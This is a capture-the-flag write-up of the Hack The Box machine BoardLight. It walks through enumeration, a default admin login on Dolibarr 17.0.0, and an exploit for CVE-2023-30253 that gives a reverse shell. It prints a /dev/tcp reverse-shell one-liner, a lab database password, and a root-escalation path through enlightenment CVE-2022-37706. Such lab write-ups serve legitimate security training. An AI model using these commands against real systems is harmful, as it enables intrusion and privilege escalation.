###### Tags
- Linux
- Dolibarr 17.0.0
- CVE-2023-30253
- Enlightenment
- CVE-2022-37706

## Summary
In this Hack The Box machine, I start of with basic Nmap enumeration. Then move on to directory enumeration and vhost enumeration using gobuster and ffuf. From here, we find an endpoint running Dollibarr v17.0.0 that is vulnerable to CVE-2023-30253. We are able to leverage this to get a reverse shell on the machine and get an initial foothold. From here, we find a password for the user `larissa` and are able to use these credentials to log in via SSH. After some quick file system enumeration, and searching for binaries with the SUID bit set... we can note that `enlightenment` is present on the box. It just so happens that this version of enlightenment is vulnerable to [CVE-2022-37706](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/README.md), a local privilege escalation vulnerability. Finally, using a public PoC bash script for [CVE-2022-37706](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/README.md) we are able to successfully escalate our privileges to the root user and obtain the root flag.
## Enumeration

Initial scan:
```bash
nmap -p- --min-rate 10000 -Pn 10.129.248.72
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-05 23:35 EDT
Warning: 10.129.248.72 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.248.72
Host is up (0.063s latency).
Not shown: 64719 closed tcp ports (conn-refused), 814 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

- Service Version, Scripts, and OS detection scan:
```bash
sudo nmap -A -Pn -O -p22,80 10.129.248.72
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-05 23:40 EDT
Nmap scan report for 10.129.248.72
Host is up (0.046s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 5.0 (97%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   45.54 ms 10.10.14.1
2   46.42 ms 10.129.248.72

```

- **Ports Open**
`22`: SSH, `80`: HTTP
- **Domain Found**: `board.htb`
- **Services**
	- OpenSSH 8.2p1
	- Apache httpd 2.4.41

- **Operating System**
Ubuntu 20.04

#### Web page
- add `board.htb` to `/etc/hosts`

#### Directory Enumeration
Nothing interesting found.

#### Vhost Enumeration
`ffuf -w /usr/share/wordlists/dirb/big.txt -H "Host:FUZZ.board.htb" -u "http://board.htb/"`
- Found: `crm.board.htb`


## Foothold
After adding `crm.board.htb` we come across a login page running `Dolibarr 17.0.0`. 
The first username/password combo I tried worked, lets go! (`admin`:`admin`)
To get a foothold on the machine, I will leverage [CVE-2023-30253](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253) to get a shell on the machine:
```bash
python exploit.py http://crm.board.htb admin admin 10.10.14.45 6969
[*] Trying authentication...
[**] Login: admin
[**] Password: admin
[*] Trying created site...
[*] Trying created page...
[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection
```
Listener:
```bash
nc -lvnp 6969
listening on [any] 6969 ...
connect to [10.10.14.45] from (UNKNOWN) [10.129.248.72] 58436
bash: cannot set terminal process group (850): Inappropriate ioctl for device
bash: no job control in this shell
# getting a backup shell on the machine just in-case
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ sh -i >& /dev/tcp/10.10.14.45/4444 0>&1 &
</website$ sh -i >& /dev/tcp/10.10.14.45/4444 0>&1 &            
[1] 1635
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$
```
Once I got a foothold, after some initial enumeration and file system exploration... I found an SSH password for the user `dolibarrowner`.

```
$dolibarr_main_url_root='http://crm.board.htb';
$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';
$dolibarr_main_url_root_alt='/custom';
$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';
$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';
$dolibarr_main_db_character_set='utf8';
$dolibarr_main_db_collation='utf8_unicode_ci';
// Authentication settings
$dolibarr_main_authentication='dolibarr';
```


## Privilege Escalation
#### Distribution type and version
```bash
cat /etc/*-release

DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04.6 LTS"
NAME="Ubuntu"
VERSION="20.04.6 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.6 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal
```
#### Kernel information
```bash
larissa@boardlight:~$ uname -a
Linux boardlight 5.15.0-107-generic #117~20.04.1-Ubuntu SMP Tue Apr 30 10:35:57 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux

larissa@boardlight:~$ cat /proc/version
Linux version 5.15.0-107-generic (buildd@lcy02-amd64-017) (gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, GNU ld (GNU Binutils for Ubuntu) 2.34) #117~20.04.1-Ubuntu SMP Tue Apr 30 10:35:57 UTC 2024
```
#### Environment variables
```bash
$ env

SHELL=/bin/bash
PWD=/home/larissa
LOGNAME=larissa
MOTD_SHOWN=pam
HOME=/home/larissa
LANG=en_US.UTF-8
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SSH_CONNECTION=10.10.14.45 55718 10.129.248.72 22
LESSCLOSE=/usr/bin/lesspipe %s %s
TERM=xterm-256color
LESSOPEN=| /usr/bin/lesspipe %s
USER=larissa
SHLVL=1
SSH_CLIENT=10.10.14.45 55718 22
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
SSH_TTY=/dev/pts/1
_=/usr/bin/env
```
#### Applications and services

#### SUID Binaries
```bash
$ find / -perm -4000 2>/dev/null

/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
/usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/sbin/pppd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/sudo
/usr/bin/su
/usr/bin/chfn
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/vmware-user-suid-wrapper
```

From the output above, we can see `enlightment`. After checking it's version:
```bash
dpkg -l | grep enlightenment
hi  enlightenment                          0.23.1-4                            amd64        X11 window manager based on EFL
hi  enlightenment-data                     0.23.1-4                            all          X11 window manager based on EFL - run time data files
```

After looking up this version of enlightenment with "exploit" we find the following link, which we can easily copy over to the machine then get root :)

root.txt: `a9d8c15af0c4817d83fa86f462e3c387`
### Resources
- https://httpd.apache.org/security/vulnerabilities_24.html
- https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/README.md
- https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253
- 